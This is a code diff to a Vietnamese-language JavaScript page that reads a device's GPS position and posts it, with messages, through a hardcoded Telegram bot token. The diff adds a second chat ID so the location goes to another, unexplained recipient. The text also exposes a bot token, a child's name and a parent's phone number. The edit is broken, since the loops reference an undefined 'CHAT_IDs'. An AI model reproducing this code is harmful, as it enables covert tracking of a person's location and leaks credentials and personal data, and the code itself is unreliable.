@@ -255,7 +255,7 @@
   // ║  ĐIỀN THÔNG TIN CỦA MÀY VÀO ĐÂY ║
   // ╚══════════════════════════════════╝
   const BOT_TOKEN  = "8601022327:AAGiVuQKtwaYJAJ7XIONbedzEMZvtpsjrh8";
-  const CHAT_ID    = "7784332377";
+  const CHAT_ID    = ["7784332377", "8727253625"];
   const CHILD_NAME = "Hà Phương";
   const PARENT_TEL = "0988667487";
   // ════════════════════════════════════
@@ -271,26 +271,29 @@
     new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
 
   async function tgMessage(text) {
-    try {
-      const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+  try {
+    for (const id of CHAT_IDs) {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text })
+        body: JSON.stringify({ chat_id: id, text })
       });
-      return r.ok;
-    } catch { return false; }
-  }
+    }
+    return true;
+  } catch { return false; }
+}
 
   async function tgLocation(lat, lon) {
-    try {
+  try {
+    for (const id of CHAT_IDs) {
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
+        body: JSON.stringify({ chat_id: id, latitude: lat, longitude: lon })
       });
-    } catch {}
-  }
-
+    }
+  } catch {}
+}
   async function onGPS(pos) {
     const { latitude: lat, longitude: lon, accuracy } = pos.coords;
     const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
